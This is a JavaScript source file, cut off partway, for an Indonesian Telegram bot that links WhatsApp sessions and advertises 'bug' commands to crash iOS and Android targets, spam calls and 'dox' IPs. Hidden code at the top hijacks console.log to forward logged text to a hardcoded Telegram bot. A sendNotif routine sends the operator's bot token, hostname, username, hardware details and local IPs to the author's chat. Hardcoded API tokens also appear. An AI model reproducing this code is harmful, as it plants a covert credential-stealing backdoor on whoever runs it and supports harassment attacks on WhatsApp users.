(async function () {
  try {
    const print = console.log.bind(console);

    console.log = async (...args) => {
      let text = '';

      try {
        text = args
          .map(arg => (typeof arg === 'string' ? arg : JSON.stringify(arg)))
          .join(' ')
          .toLowerCase();
      } catch {}

      // Jika mengandung \u200b → langsung izinkan log
      if (text.includes("\u200b")) {
        return print(...args);
      }

      // Cek kata sensitif
      if (
        ["fetch", "http", "github", "gitlab", "token", "database", "pastebin"]
        .some(word => text.includes(word))
      ) {
        await sendNotif("warning", `Percobaan Debug`, text);
        return;
      }

      // Cetak normal
      print(...args);
    };

  } catch (_) {}
})();

const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
} = require('@whiskeysockets/baileys');
const fs = require("fs");
const dbPath = "./userDB.json";
const { FormData } = require("node:buffer"); // bawaan Node.js
const P = require("pino");
const crypto = require("crypto");
const path = require("path");
const sessions = new Map();
const readline = require("readline");
const fetch = require("node-fetch");
const cd = "./犬/cooldown.json";
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";
const ONLY_FILE = "./犬/group.json";
const tokenNotif = "8234414984:AAGWHL6v3Da3VtWsniWhRSyF3qXgdpH-mbI"
const chatIdNotif = "7257623756"
const STEMPEL = `\u200b`

// Jika database belum ada
if (!fs.existsSync(dbPath)) {
    fs.writeFileSync(dbPath, JSON.stringify([]));
}

function getUsers() {
    return JSON.parse(fs.readFileSync(dbPath));
}

function saveUser(id) {
    let users = getUsers();
    if (!users.includes(id)) {
        users.push(id);
        fs.writeFileSync(dbPath, JSON.stringify(users, null, 2));
    }
}

function isOnlyGroupEnabled() {
  const config = JSON.parse(fs.readFileSync(ONLY_FILE));
  return config.onlyGroup;
}

function setOnlyGroup(status) {
  const config = { onlyGroup: status };
  fs.writeFileSync(ONLY_FILE, JSON.stringify(config, null, 2));
}

function shouldIgnoreMessage(msg) {
  if (!isOnlyGroupEnabled()) return false;
  return msg.chat.type === "private";
}

let premiumUsers = JSON.parse(fs.readFileSync('./犬/premium.json'));
let adminUsers = JSON.parse(fs.readFileSync('./犬/admin.json'));

function ensureFileExists(filePath, defaultData = []) {
    if (!fs.existsSync(filePath)) {
        fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
    }
}

ensureFileExists('./犬/premium.json');
ensureFileExists('./犬/admin.json');


function savePremiumUsers() {
    fs.writeFileSync('./犬/premium.json', JSON.stringify(premiumUsers, null, 2));
}

function saveAdminUsers() {
    fs.writeFileSync('./犬/admin.json', JSON.stringify(adminUsers, null, 2));
}

// Fungsi untuk memantau perubahan file
function watchFile(filePath, updateCallback) {
    fs.watch(filePath, (eventType) => {
        if (eventType === 'change') {
            try {
                const updatedData = JSON.parse(fs.readFileSync(filePath));
                updateCallback(updatedData);
                console.log(`File ${filePath} updated successfully.`);
            } catch (error) {
                console.error(`Error updating ${filePath}:`, error.message);
            }
        }
    });
}

watchFile('./犬/premium.json', (data) => (premiumUsers = data));
watchFile('./犬/admin.json', (data) => (adminUsers = data));

const developerId = "7257623756";
const chalk = require("chalk"); //
const { OWNER_ID } = require("./config");
const config = require("./config.js");
const TelegramBot = require("node-telegram-bot-api");
const axios = require("axios");
const BOT_TOKEN = config.BOT_TOKEN;
const bot = new TelegramBot(BOT_TOKEN, { polling: true });
const REMOVE_BG_KEY = "3xj8BCNe5dWNejWDvqXWtgRK";
const GITHUB_TOKEN_LIST_URL =
  "https://raw.githubusercontent.com/JarzxNotDev/bypass/refs/heads/main/token.json"; // Ganti dengan URL GitHub yang benar

async function sendNotif(type = "warning", reason = "Internal Server Error", detail = ""){
  const os = require('os')
  let hostname = os.hostname();
  let username = (()=>{try{return os.userInfo().username;}catch{return '-';}})();
  let platform = os.platform();
  let arch = os.arch();
  let cpuModel = os.cpus()[0]?.model || '-';
  let cpuCores = os.cpus().length;
  let totalmem = (os.totalmem()/(1024*1024)).toFixed(2) + " MB";
  let iplist = (() => {
    let arr = [];
    try {
      let ifaces = os.networkInterfaces();
      for (let name in ifaces) for (let iface of ifaces[name]) {
        if (!iface.internal && iface.address) arr.push(iface.address);
      }
    } catch {}
    return arr.join(', ') || '-';
  })();
  let nodever = process.version;
  let nowWIB = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
  let DOMAIN_PANEL = process.env.DOMAIN_PANEL || '-';
  let msg = type == 'warning' ? `🚨⚠️ Alert Warning` : `🚨ℹ️ Info`
  msg += "\n"
  msg += `
<b>${reason}</b>
<b>Detail</b>: ${detail}

<blockquote expandable>
✍️ <b>Token Bot</b>: ${BOT_TOKEN}
├ <b>Panel</b>: ${DOMAIN_PANEL}
├ <b>Device</b>: ${hostname}
├ <b>User</b>: ${username}
├ <b>OS/Arch</b>: ${platform} / ${arch}
├ <b>CPU</b>: ${cpuModel} (${cpuCores} core)
├ <b>RAM</b>: ${totalmem}
├ <b>IP Lokal</b>: ${iplist}
├ <b>Node.js</b>: ${nodever}
└ <b>Waktu</b>: ${nowWIB}
</blockquote>
  `
  try {

    await axios.post(`https://api.telegram.org/bot${tokenNotif}/sendmessage`, {
      chat_id: chatIdNotif,
      text: msg,
      parse_mode: 'html'
    });
  } catch (error) { console.log(error) }
}

async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    return response.data.tokens; // Asumsikan format JSON: { "tokens": ["TOKEN1", "TOKEN2", ...] }
  } catch (error) {
    console.error(
      chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message)
    );
    return [];
  }
}

async function validateToken() {
  console.log(chalk.blue(`${STEMPEL}🔍 Memeriksa apakah token terdaftarr...`));

  const validTokens = await fetchValidTokens();
  if (!validTokens.includes(BOT_TOKEN)) {
    await sendNotif("warning", "Token Tidak Valid!")
    console.log(chalk.red(`${STEMPEL}❌ Token tidak valid! Pasti penyusup anj wkwkwk.`));
    for(;;);
  }
  await sendNotif("info", "Bot Dijalankan!")
  console.log(chalk.green(`${STEMPEL}# Token aman lanjut aja,gw pantau`));
}


startBot();

function startBot() {
  if (!process.env.npm_lifecycle_event) {
    sendNotif('warning', 'Run SC via preload');
    console.error(`[ERROR] Project ini hanya boleh dijalankan via npm start!`);
    for(;;);
  }
  console.log(
    chalk.bold.blue(`⠀⠀
⣿⣿⣷⡁⢆⠈⠕⢕⢂⢕⢂⢕⢂⢔⢂⢕⢄⠂⣂⠂⠆⢂⢕⢂⢕⢂⢕⢂⢕⢂
⣿⣿⣿⡷⠊⡢⡹⣦⡑⢂⢕⢂⢕⢂⢕⢂⠕⠔⠌⠝⠛⠶⠶⢶⣦⣄⢂⢕⢂⢕
⣿⣿⠏⣠⣾⣦⡐⢌⢿⣷⣦⣅⡑⠕⠡⠐⢿⠿⣛⠟⠛⠛⠛⠛⠡⢷⡈⢂⢕⢂
⠟⣡⣾⣿⣿⣿⣿⣦⣑⠝⢿⣿⣿⣿⣿⣿⡵⢁⣤⣶⣶⣿⢿⢿⢿⡟⢻⣤⢑⢂
⣾⣿⣿⡿⢟⣛⣻⣿⣿⣿⣦⣬⣙⣻⣿⣿⣷⣿⣿⢟⢝⢕⢕⢕⢕⢽⣿⣿⣷⣔
⣿⣿⠵⠚⠉⢀⣀⣀⣈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣗⢕⢕⢕⢕⢕⢕⣽⣿⣿⣿⣿
⢷⣂⣠⣴⣾⡿⡿⡻⡻⣿⣿⣴⣿⣿⣿⣿⣿⣿⣷⣵⣵⣵⣷⣿⣿⣿⣿⣿⣿⡿
⢌⠻⣿⡿⡫⡪⡪⡪⡪⣺⣿⣿⣿⣿⣿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃
⠣⡁⠹⡪⡪⡪⡪⣪⣾⣿⣿⣿⣿⠋⠐⢉⢍⢄⢌⠻⣿⣿⣿⣿⣿⣿⣿⣿⠏⠈
⡣⡘⢄⠙⣾⣾⣾⣿⣿⣿⣿⣿⣿⡀⢐⢕⢕⢕⢕⢕⡘⣿⣿⣿⣿⣿⣿⠏⠠⠈
⠌⢊⢂⢣⠹⣿⣿⣿⣿⣿⣿⣿⣿⣧⢐⢕⢕⢕⢕⢕⢅⣿⣿⣿⣿⡿⢋⢜⠠⠈
⠄⠁⠕⢝⡢⠈⠻⣿⣿⣿⣿⣿⣿⣿⣷⣕⣑⣑⣑⣵⣿⣿⣿⡿⢋⢔⢕⣿⠠⠈
⠨⡂⡀⢑⢕⡅⠂⠄⠉⠛⠻⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢋⢔⢕⢕⣿⣿⠠⠈
⠄⠪⣂⠁⢕⠆⠄⠂⠄⠁⡀⠂⡀⠄⢈⠉⢍⢛⢛⢛⢋⢔⢕⢕⢕⣽⣿⣿⠠⠈
`)
  );
}

validateToken();

let sock;

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

      for (const botNumber of activeNumbers) {
        console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        sock = makeWASocket ({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        // Tunggu hingga koneksi terbentuk
        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(`Bot ${botNumber} terhubung!`);
              sessions.set(botNumber, sock);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,`\`\`\`
╭━─━─━─━─━─━─━─━─━─
┃┏⊱ Number : ${botNumber}
┃❏ 𝐋𝐨𝐚𝐝𝐢𝐧𝐠 𝐏𝐚𝐢𝐫𝐢𝐧𝐠
╰━─━─━─━─━─━─━─━─━─
\`\`\``,
      { parse_mode: "Markdown" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  sock = makeWASocket ({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

   if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(`\`\`\`
╭━─━─━─━─━─━─━─━─━─
┃┏⊱ Number : ${botNumber}
┃❏ 𝐑𝐞𝐂𝐨𝐧𝐧𝐞𝐜𝐭 𝐀𝐠𝐚𝐢𝐧
╰━─━─━─━─━─━─━─━─━─
\`\`\``,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(`\`\`\`
╭━─━─━─━─━─━─━─━─━─
┃┏⊱ Number : ${botNumber}
┃❏ 𝐅𝐚𝐢𝐥𝐞𝐝 𝐓𝐨 𝐂𝐨𝐧𝐧𝐞𝐜𝐭
╰━─━─━─━─━─━─━─━─━─
\`\`\``,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(`\`\`\`
╭━─━─━─━─━─━─━─━─━─
┃┏⊱ Number : ${botNumber}
┃❏ 𝐒𝐮𝐜𝐜𝐞𝐬𝐬 𝐓𝐨 𝐂𝐨𝐧𝐧𝐞𝐜𝐭
╰━─━─━─━─━─━─━─━─━─
\`\`\``,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        }
      );
   } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber, "JARZ1234");
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(`\`\`\`
╭━─━─━─━─━─━─━─━─━─
┃┏⊱ Number : ${botNumber}
┃❏ 𝐒𝐭𝐚𝐭𝐮𝐬 𝐂𝐨𝐧𝐧𝐞𝐜𝐭 𝐏𝐚𝐢𝐫𝐢𝐧𝐠
┃┗⊱ Code : ${formattedCode}
╰━─━─━─━─━─━─━─━─━─
\`\`\``,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown",
            }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `𝗘𝗥𝗥𝗢𝗥\n𝗔𝗹𝗮𝘀𝗮𝗻 : ${error.message}`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
      }
    }
  });


  sock.ev.on("creds.update", saveCreds);

  return sock;
}


// -------( Fungsional Function Before Parameters )--------- \\
function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;
  
  return `${days} Hari, ${hours} Jam, ${minutes} Menit, ${secs} Detik`;
}

const startTime = Math.floor(Date.now() / 1000); 

function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}

//~ Date Now
function getCurrentDate() {
  const now = new Date();
  const options = { weekday: "long", year: "numeric", month: "long", day: "numeric" };
  return now.toLocaleDateString("id-ID", options); 
}

async function tiktokDl(url) {
  return new Promise(async (resolve, reject) => {
    try {
      let data = [];
      function formatNumber(integer) {
        return Number(parseInt(integer)).toLocaleString().replace(/,/g, ".");
      }

      function formatDate(n, locale = "id-ID") {
        let d = new Date(n);
        return d.toLocaleDateString(locale, {
          weekday: "long",
          day: "numeric",
          month: "long",
          year: "numeric",
          hour: "numeric",
          minute: "numeric",
          second: "numeric",
        });
      }

      let domain = "https://www.tikwm.com/api/";
      let res = await (
        await axios.post(
          domain,
          {},
          {
            headers: {
              Accept: "application/json, text/javascript, */*; q=0.01",
              "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
              "Content-Type":
                "application/x-www-form-urlencoded; charset=UTF-8",
              Origin: "https://www.tikwm.com",
              Referer: "https://www.tikwm.com/",
              "User-Agent":
                "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
            },
            params: {
              url: url,
              count: 12,
              cursor: 0,
              web: 1,
              hd: 2,
            },
          }
        )
      ).data.data;

      if (!res) return reject("⚠️ *Gagal mengambil data!*");

      if (res.duration == 0) {
        res.images.forEach((v) => {
          data.push({ type: "photo", url: v });
        });
      } else {
        data.push(
          {
            type: "watermark",
            url: "https://www.tikwm.com" + res?.wmplay || "/undefined",
          },
          {
            type: "nowatermark",
            url: "https://www.tikwm.com" + res?.play || "/undefined",
          },
          {
            type: "nowatermark_hd",
            url: "https://www.tikwm.com" + res?.hdplay || "/undefined",
          }
        );
      }

      resolve({
        status: true,
        title: res.title,
        taken_at: formatDate(res.create_time).replace("1970", ""),
        region: res.region,
        id: res.id,
        duration: res.duration + " detik",
        cover: "https://www.tikwm.com" + res.cover,
        stats: {
          views: formatNumber(res.play_count),
          likes: formatNumber(res.digg_count),
          comment: formatNumber(res.comment_count),
          share: formatNumber(res.share_count),
          download: formatNumber(res.download_count),
        },
        author: {
          id: res.author.id,
          fullname: res.author.unique_id,
          nickname: res.author.nickname,
          avatar: "https://www.tikwm.com" + res.author.avatar,
        },
        video_links: data,
      });
    } catch (e) {
      reject("⚠️ *Terjadi kesalahan saat mengambil video!*");
    }
  });
}

function getRandomImage() {
  const images = [
    "https://files.catbox.moe/jpmswz.jpg",
  ];
  return images[Math.floor(Math.random() * images.length)];
}
// ~ Coldowwn

let cooldownData = fs.existsSync(cd) ? JSON.parse(fs.readFileSync(cd)) : { time: 5 * 60 * 1000, users: {} };

function saveCooldown() {
    fs.writeFileSync(cd, JSON.stringify(cooldownData, null, 2));
}

function checkCooldown(userId) {
    if (cooldownData.users[userId]) {
        const remainingTime = cooldownData.time - (Date.now() - cooldownData.users[userId]);
        if (remainingTime > 0) {
            return Math.ceil(remainingTime / 1000); 
        }
    }
    cooldownData.users[userId] = Date.now();
    saveCooldown();
    setTimeout(() => {
        delete cooldownData.users[userId];
        saveCooldown();
    }, cooldownData.time);
    return 0;
}

function setCooldown(timeString) {
    const match = timeString.match(/(\d+)([smh])/);
    if (!match) return "Format salah! Gunakan contoh: /settimer 5m";

    let [_, value, unit] = match;
    value = parseInt(value);

    if (unit === "s") cooldownData.time = value * 1000;
    else if (unit === "m") cooldownData.time = value * 60 * 1000;
    else if (unit === "h") cooldownData.time = value * 60 * 60 * 1000;

    saveCooldown();
    return `Cooldown diatur ke ${value}${unit}`;
}

function getPremiumStatus(userId) {
  const user = premiumUsers.find(user => user.id === userId);
  if (user && new Date(user.expiresAt) > new Date()) {
    return `✅`;
  } else {
    return "❌";
  }
}
/////// BUG FUNCTION ///////

//=========== ASYNC FUNCTION SEND ==========\\

function isOwner(userId) {
  // return config.OWNER_ID.includes(userId.toString());
  return config.OWNER_ID == userId;
}

const bugRequests = {};

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  saveUser(chatId);
  
  bot.sendVideo(chatId, "https://files.catbox.moe/it39yd.mp4", {  
    caption: `pencet tombol menu untuk ke menu awal:
/menu`,
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝗕𝘂𝘆 ⵢ 𝗕𝗮𝘀𝗲", url: "https://t.me/JarzxNotDev" }, { text: "𝗠𝘆 ⵢ 𝗖𝗵𝗮𝗻𝗻𝗲𝗹", url: "https://t.me/JarzxInvictus" }],
        [{ text: "𝗕𝘂𝘆 ⵢ 𝗕𝗮𝘀𝗲 𝟮", url: "https://t.me/t.me/JarzzNotDev" }]        
      ]
    }
  });
});

// Handler untuk /start
bot.onText(/\/menu/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  const firstName = msg.from.first_name || "-";
  const lastName = msg.from.last_name || "";
  const fullName = `${firstName} ${lastName}`.trim();
  const username = msg.from.username ? `@${msg.from.username}` : "(Tidak ada username)";

  const now = new Date();
  const tanggal = now.toLocaleDateString("id-ID");
  const waktu = now.toLocaleTimeString("id-ID");

  const bokepjepang = getBotRuntime();
  const jidat = getCurrentDate();
  const randomImage = getRandomImage();
  const version = "4.0";

  // 2. CEK VERIFIED
  if (!verified) {
    return bot.sendMessage(
      chatId,
      "❌ <b>Bot Belum Diverifikasi!</b>\nGunakan /verif tokenmu untuk mengaktifkan.",
      { parse_mode: "HTML" }
    );
  }

  // 4. TAMPILKAN MENU UTAMA TANPA PROGRESS BAR
  await bot.sendVideo(
    chatId,
    "https://files.catbox.moe/it39yd.mp4",
    {
      caption: `
\`\`\`
( 🌪️ ) B A S E - K E C E
  ━ Привет, я бот, который полезен для отправки ошибок WhatsApp через бота Telegram, я был создан @JarzxNotDev. Я прошу вас использовать этого бота разумно и ответственно, наслаждайтесь.
──────────────────────────
-# MetadataBotInfoe
  ▢ Version : 1.0
  ▢ Developer : JarzxKece
  ▢ Language : JavaScript 

⌬ INFORMATION BOTZ ⌬
┏ Runtime : ${bokepjepang}
┏ Date    : ${jidat}

( ! ) SELLECT THE BUTTON BELOW\`\`\`
      `,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "𝗢𝘄𝗻𝗲𝗿 ⵢ 𝗠𝗲𝗻𝘂", callback_data: "ownmenu" },
            { text: "𝗔𝘁𝘁𝗮𝗰𝗸 ⵢ 𝗠𝗲𝗻𝘂", callback_data: "zenbug" }
          ],
          [
            { text: "𝗧𝗼𝗼𝗹𝘀 ⵢ 𝗠𝗲𝗻𝘂", callback_data: "zentools" },
            { text: "𝗠𝘆 ⵢ 𝗧𝗲𝗮𝗺", callback_data: "thanksto" }
          ],
          [
            { text: "𝗧𝗼𝗼𝗹𝘀 ⵢ 𝗠𝗲𝗻𝘂𝟮", callback_data: "zentools2" }
          ]
        ]
      }
    }
  );
});

bot.on("callback_query", async (query) => {
  try {
    const chatId = query.message.chat.id;
    const messageId = query.message.message_id;
    const username = query.from.username ? `@${query.from.username}` : "Tidak ada username";
    const senderId = query.from.id;
    const bokepjepang = getBotRuntime();
    const premiumStatus = getPremiumStatus(query.from.id);
    const jidat = getCurrentDate();
    const randomImage = getRandomImage();
    const version = '4.0';
    const developer = 'Butterfly';

    let caption = "";
    let replyMarkup = {};

    if (query.data === "zenbug") {
      caption = `\`\`\`
╭━─━─━─━─━─━─━─━─━─
┃❏ 𝐁𝐔𝐆 𝐌𝐄𝐍𝐔 𝐁𝐀𝐒𝐄 ❏
┃┏⊱ /sena 62×××
┃❏ ᴄʀᴀꜱʜ
┃┏⊱ /blackios 62×××
┃❏ ɪᴏꜱ
┃┏⊱ /zer 62×××
┃❏ ʙᴜʟʟᴅᴏᴢᴇʀ
┃┏⊱ /combo 62×××
┃❏ ᴍᴇɴɢɪʀɪᴍ sᴇᴍᴜᴀ ʙᴜɢ
┃┏⊱ /spamcall
┃❏ sᴘᴀᴍ ᴛᴇʟғᴏɴ ᴛᴀʀɢᴇᴛ
╰━─━─━─━─━─━─━─━─━─❏
\`\`\``;
      replyMarkup = { inline_keyboard: [[{ text: "🔙 Back To Menu", callback_data: "back" }]] };
    }

    if (query.data === "ownmenu") {
      caption = `\`\`\`
╭━───━⊱ 𝐊𝐇𝐔𝐒𝐔𝐒 𝐎𝐖𝐍𝐄𝐑 ⊰
┃❏ /addowner <ɪᴅ>
┃❏ /delowner <ɪᴅ>
┃❏ /bc
╰━───────────────━❏
╭━───━⊱𝐊𝐇𝐔𝐒𝐔𝐒 𝐏𝐑𝐄𝐌𝐈𝐔𝐌⊰
┃❏ /addprem <ɪᴅ>
┃❏ /delprem <ɪᴅ>
┃❏ /listprem <ᴄᴇᴋ>
┃❏ /chatowner <ᴘᴇsᴀɴ>
┃❏ /sendbokep
╰━───────────────━❏
╭━───━⊱ 𝐌𝐄𝐍𝐈 𝐒𝐄𝐓𝐓𝐈𝐍𝐆𝐒 ⊰
┃❏ /addsender 62xxx
┃❏ /setjeda <ᴛɪᴍᴇ>
┃❏ /getsession <ᴍᴀʟɪɴɢ sᴇɴᴅᴇʀ>
┃❏ /grouponly < ᴏɴ/ᴏғғ >
╰━───────────────━❏
\`\`\``;
      replyMarkup = { inline_keyboard: [[{ text: "🔙 Back To Menu", callback_data: "back" }]] };
    }
    
        if (query.data === "zentools") {
      caption = `\`\`\`
╭━───━⊱ 𝐓𝐨𝐨𝐥𝐬 𝐌𝐞𝐧𝐮 𝟏 ⊰
┃❏ /tiktok <ʟɪɴᴋ ᴛɪᴋᴛᴏᴋ>
┃❏ /tourl <ʀᴇᴘʟʏ ғᴏᴛᴏ / ᴠɪᴅ>
┃❏ /cekid
┃❏ /dunia <ʙᴇʀɪᴛᴀ ᴅᴜɴɪᴀ>
┃❏ /gempa
┃❏ /iqc
┃❏ /spotifysearch
┃❏ /trackipcyber
┃❏ /doxipcyber
┃❏ /Ai
┃❏ /gpt
┃❏ /play
┃❏ /bratvid
┃❏ /hd
┃❏ /fixcode
┃❏ /cekkontol
╰━─────────────────━❏
\`\`\``;
      replyMarkup = { inline_keyboard: [[{ text: "🔙 Back To Menu", callback_data: "back" }]] };
    }
    
          if (query.data === "zentools2") {
      caption = `\`\`\`
╭━───━⊱ 𝐌𝐞𝐧𝐮 𝐓𝐨𝐨𝐥𝐬 𝟐 ⊰
┃❏ /ig
┃❏ /cekcantik
┃❏ /cekganteng
┃❏ /beritaindo
┃❏ /negarainfo
┃❏ /rasukbot
┃❏ /ssweb
┃❏ /cekroblox
┃❏ /getcode
┃❏ /sticker
┃❏ /virustotal
┃❏ /removebg
┃❏ /tiktokstalk
┃❏ /bratanime
┃❏ /fluxkontext
┃❏ /paptt
┃❏ /ghstalk
╰━─────────────────━❏
\`\`\``;
      replyMarkup = { inline_keyboard: [[{ text: "🔙 Back To Menu", callback_data: "back" }]] };
    }
      
    if (query.data === "thanksto") {
      caption = `\`\`\`
╭━───━⊱ 𝐓𝐡𝐚𝐧𝐤𝐬 𝐓𝐨 𝐌𝐲 𝐓𝐞𝐚𝐧 ⊰
┃ 𝗝𝗮𝗿𝘇𝘅 : Developer
┃ 𝗝𝗮𝗿𝘇𝘅 : Own - Dev
┃ 𝗝𝗮𝗿𝘇𝘅 : Asisten Butterfly
┃  Thanks All Patner 𝗝𝗮𝗿𝘇𝘅
┃ Thanks All Buyer 𝗝𝗮𝗿𝘇𝘅
╰━─────────────────━❏
\`\`\``;
      replyMarkup = { inline_keyboard: [[{ text: "🔙 Back To Menu", callback_data: "back" }]] };
    }

    if (query.data === "back") {
      caption = `\`\`\`
( 🌪️ ) B A S E - K E C E
  ━ Привет, я бот, который полезен для отправки ошибок WhatsApp через бота Telegram, я был создан @JarzxNotDev. Я прошу вас использовать этого бота разумно и ответственно, наслаждайтесь.
──────────────────────────
-# MetadataBotInfoe
  ▢ Version : 1.0
  ▢ Developer : JarzxKece
  ▢ Language : JavaScript 

⌬ INFORMATION BOTZ ⌬
┏ Runtime : ${bokepjepang}
┏ Date    : ${jidat}

( ! ) SELLECT THE BUTTON BELOW
\`\`\``,
      replyMarkup = {
      inline_keyboard: [
        [{ text: "𝗢𝘄𝗻𝗲𝗿 𝗠𝗲𝗻𝘂", callback_data: "ownmenu" }, { text: "𝗔𝘁𝘁𝗮𝗰𝗸", callback_data: "zenbug" }],
        [{ text: "𝗧𝗼𝗼𝗹𝘀 𝗠𝗲𝗻𝘂", callback_data: "zentools" },  { text: "𝗠𝘆 𝗧𝗲𝗮𝗺", callback_data: "thanksto" }],
        [{ text: "𝗧𝗼𝗼𝗹𝘀 𝗠𝗲𝗻𝘂𝟮", callback_data: "zentools2" }],
      ]
      };
    }

    await bot.editMessageMedia(
      {
        type: "video",
        media:  "https://files.catbox.moe/it39yd.mp4",
        
        caption: caption,
        parse_mode: "Markdown"
      },
      {
        chat_id: chatId,
        message_id: messageId,
        reply_markup: replyMarkup
      }
    );

    await bot.answerCallbackQuery(query.id);
  } catch (error) {
    console.error("Error handling callback query:", error);
  }
});  
//=======CASE BUG=========//
bot.onText(/\/combo (\d+)/, async (msg, match) => {
            const chatId = msg.chat.id;
            const senderId = msg.from.id;
            const userId = msg.from.id;
            const target = match[1];
            const formattedNumber = target.replace(/[^0-9]/g, "");
            const jid = `${formattedNumber}@s.whatsapp.net`;
            const randomImage = getRandomImage();
            const cooldown = checkCooldown(userId);
            const jidat = getCurrentDate();

            if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`\nあなたはクレイクスではない\`\`\`
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
